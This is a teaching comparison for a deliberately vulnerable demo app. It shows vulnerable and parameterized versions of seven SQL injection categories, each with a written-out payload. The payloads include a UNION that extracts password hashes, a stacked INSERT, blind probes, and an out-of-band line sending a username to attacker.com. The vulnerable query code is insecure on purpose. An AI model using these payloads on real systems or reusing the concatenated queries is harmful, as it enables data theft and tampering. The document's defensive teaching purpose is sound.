# SQL INJECTION CATEGORY COMPARISONS

This document strictly compares the vulnerable and prevented implementations of the 7 SQL injection categories.

---

## 1. CLASSIC / IN-BAND SQL INJECTION

**1. Vulnerable endpoint:**
`GET /api/teacher/students?q=...` (`vulnerable/backend/routers/teacher.py`)

**2. Vulnerable query construction:**
```python
query = query.filter(text(f"name LIKE '%{q}%' OR register_number LIKE '%{q}%'"))
```

**3. Why vulnerable:**
The backend initially applies a legitimate data isolation filter `department_id = X` to restrict the teacher's view. However, it appends the user input directly via `text()`. An attacker can inject `a%' OR 1=1 --`. Because the text filter is appended with `AND`, the resulting clause `department_id = X AND name LIKE '%a%' OR 1=1 --` evaluates to True for all rows (due to `OR` precedence), bypassing the department isolation completely.

**4. Prevented endpoint:**
`GET /api/teacher/students?q=...` (`prevented/backend/routers/teacher.py`)

**5. Prevented implementation:**
```python
query = query.filter(
    or_(
        Student.name.ilike(f"%{q}%"),
        Student.register_number.ilike(f"%{q}%")
    )
)
```

**6. Why prevented:**
The SQLAlchemy ORM handles the parameterization. The `ilike` function translates the payload directly into string literal arguments, ensuring they cannot break out of the intended logical groupings.

**7. Exact demo workflow:**
Teacher Portal → Students → Enter `a%' OR 1=1 --` in the Search Box.

**8. Expected result:**
- **Vulnerable:** The legitimate department boundary is bypassed, and students from all departments (ECE, IT, MECH) populate the UI table.
- **Prevented:** 0 students are found, preserving the authorized data scope.

---

## 2. UNION-BASED SQL INJECTION

**1. Vulnerable endpoint:**
`GET /api/student/notices/{notice_id}` (`vulnerable/backend/routers/student.py`)

**2. Vulnerable query construction:**
```python
query = f"""
    SELECT n.id, n.title, n.category, n.content, n.target_audience, 
           n.publish_date, n.expiry_date, t.name as author_name 
    FROM notices n LEFT JOIN teachers t ON n.author_id = t.id 
    WHERE n.id = {notice_id}
"""
result = db.execute(text(query)).mappings().first()
```

**3. Why vulnerable:**
The application maps a raw SQL string query directly to UI responses. The attacker can supply `-1 UNION SELECT ... FROM users`, executing a secondary query that extracts data from the completely unrelated `users` table and forces it into the structure expected by the Notice UI.

**4. Prevented endpoint:**
`GET /api/student/notices/{notice_id}` (`prevented/backend/routers/student.py`)

**5. Prevented implementation:**
```python
notice = db.query(Notice).filter(Notice.id == notice_id).first()
```

**6. Why prevented:**
The ORM executes a parameterized lookup. The `notice_id` string is strictly cast against the expected integer ID type, preventing UNION syntax evaluation.

**7. Exact demo workflow:**
Student Portal → Notices → Enter `-1 UNION SELECT 999, 'STOLEN DATA', 'Secret', username || ' : ' || hashed_password, 'all', '2025-01-01', '2025-12-31', 'Hacker' FROM users LIMIT 1 --` in the Lookup Notice field.

**8. Expected result:**
- **Vulnerable:** The UI displays a valid-looking notice containing the actual password hash of a user.
- **Prevented:** Returns an error or "Notice not found".

---

## 3. STACKED QUERIES

**1. Vulnerable endpoint:**
`GET /api/teacher/students/{student_id}` (`vulnerable/backend/routers/teacher.py`)

**2. Vulnerable query construction:**
```python
conn.executescript(f"INSERT INTO search_history (term) VALUES ('{student_id}');")
```

**3. Why vulnerable:**
The audit logging uses `executescript()`, which allows multiple semi-colon separated statements to execute. An attacker can terminate the `INSERT` and start a brand new `INSERT INTO notices` statement.

**4. Prevented endpoint:**
`GET /api/teacher/students/{student_id}` (`prevented/backend/routers/teacher.py`)

**5. Prevented implementation:**
```python
search_record = SearchHistory(term=student_id)
db.add(search_record)
db.commit()
```

**6. Why prevented:**
The `db.add()` method abstracts the insert operation and does not support executing multiple statements per request.

**7. Exact demo workflow:**
Teacher Portal → Students → Enter `1'); INSERT INTO notices (title, category, content, target_audience, publish_date, expiry_date, author_id) VALUES ('Hacked Notice', 'Alert', 'This was created via Stacked Query!', 'all', '2025-01-01', '2025-12-31', 1); --` in the Lookup By ID field.

**8. Expected result:**
- **Vulnerable:** The student profile loads. Check the "Notices" page, and a new "Hacked Notice" has been maliciously inserted into the database.
- **Prevented:** The profile lookup simply fails ("Student not found") with no side effects.

---

## 4. BOOLEAN-BASED BLIND SQL INJECTION

**1. Vulnerable endpoint:**
`GET /api/teacher/verify-student?register_number=...` (`vulnerable/backend/routers/teacher.py`)

**2. Vulnerable query construction:**
```python
query = f"SELECT 1 FROM students WHERE register_number = '{register_number}'"
```

**3. Why vulnerable:**
The endpoint doesn't return data, only a True/False boolean. However, the input is concatenated, meaning attackers can append `AND (condition)`. They can observe the True/False outcome to map out restricted data blindly.

**4. Prevented endpoint:**
`GET /api/teacher/verify-student?register_number=...` (`prevented/backend/routers/teacher.py`)

**5. Prevented implementation:**
```python
result = db.query(Student).filter(Student.register_number == register_number).first()
```

**6. Why prevented:**
The input is treated strictly as a single string literal, preventing logical operators from evaluating.

**7. Exact demo workflow:**
Teacher Portal → Students → Verification Field. Test `REG2023100' AND 1=1 --` vs `REG2023100' AND 1=0 --`.

**8. Expected result:**
- **Vulnerable:** TRUE yields "Verified", FALSE yields "Not Verified".
- **Prevented:** Both yield "Not Verified" because no student is literally named `REG2023100' AND 1=1 --`.

---

## 5. TIME-BASED BLIND SQL INJECTION

**1. Vulnerable endpoint:**
`GET /api/student/check-eligibility?subject_code=...` (`vulnerable/backend/routers/student.py`)

**2. Vulnerable query construction:**
```python
query = f"SELECT * FROM subjects WHERE code = '{subject_code}'"
```

**3. Why vulnerable:**
Concatenation allows an attacker to inject `AND (SELECT sleep(3)) = 1`. The database engine executes the sleep instruction if the condition is met, exposing data completely blind via measurable time delays.

**4. Prevented endpoint:**
`GET /api/student/check-eligibility?subject_code=...` (`prevented/backend/routers/student.py`)

**5. Prevented implementation:**
```python
result = db.query(Subject).filter(Subject.code == subject_code).first()
```

**6. Why prevented:**
ORM parameterization treats the `sleep(3)` payload as literal text value rather than an executable command.

**7. Exact demo workflow:**
Student Portal → Subjects → Enter `CS101' AND (SELECT sleep(3)) = 1 --` in Eligibility field.

**8. Expected result:**
- **Vulnerable:** The browser hangs and loading spinner spins for exactly 3 seconds.
- **Prevented:** Immediate response; no delay.

---

## 6. OUT-OF-BAND (OOB) SQL INJECTION

**1. Vulnerable endpoint:**
`POST /api/student/report-issue` (`vulnerable/backend/routers/student.py`)

**2. Vulnerable query construction:**
```python
query = f"INSERT INTO sql_demo_records (data) VALUES ('Issue: {data.title} - {data.description}')"
conn.executescript(query)
```

**3. Why vulnerable:**
`executescript` is used. A stacked injection triggers a mock `http_get()` call that bypasses the application server entirely, exfiltrating stolen data directly via a mock HTTP network protocol.

**4. Prevented endpoint:**
`POST /api/student/report-issue` (`prevented/backend/routers/student.py`)

**5. Prevented implementation:**
```python
record = SQLDemoRecord(data=f"Issue: {data.title} - {data.description}")
db.add(record)
```

**6. Why prevented:**
ORM restricts statement stacking and parameterizes the input. The `http_get` command is treated as literal text.

**7. Exact demo workflow:**
Student Portal → Subjects → Enter `Test'); SELECT http_get('http://attacker.com/steal?data=' || (SELECT username FROM users LIMIT 1)); --` in Issue Description. Then check the Security Demo page.

**8. Expected result:**
- **Vulnerable:** A mock HTTP request is generated and visible in the OOB Demo Logs table.
- **Prevented:** No mock request is generated.

---

## 7. SECOND-ORDER SQL INJECTION

**1. Vulnerable endpoint:**
`GET /api/student/blood-drive-status` (`vulnerable/backend/routers/student.py`)

**2. Vulnerable query construction:**
```python
query = f"SELECT * FROM blood_inventory WHERE blood_group = '{student.blood_group}'"
result = db.execute(text(query)).fetchone()
```

**3. Why vulnerable:**
The backend safely stored the user's `blood_group` payload in the database. However, this endpoint incorrectly assumes data retrieved *from* the database is safe, using it directly in a raw string query.

**4. Prevented endpoint:**
`GET /api/student/blood-drive-status` (`prevented/backend/routers/student.py`)

**5. Prevented implementation:**
```python
record = db.query(BloodInventory).filter(BloodInventory.blood_group == student.blood_group).first()
```

**6. Why prevented:**
The ORM maintains parameterization even for data retrieved from its own database, preventing the secondary execution.

**7. Exact demo workflow:**
Student Portal → Profile → Update Blood Group to `O-' UNION SELECT 999, 'O-', 9999 --`. Then click "Check Blood Drive Need".

**8. Expected result:**
- **Vulnerable:** The UI reports "Blood Drive Status: Sufficient" because the injected UNION altered the returned inventory count to 9999.
- **Prevented:** The UI reports "Not Found".
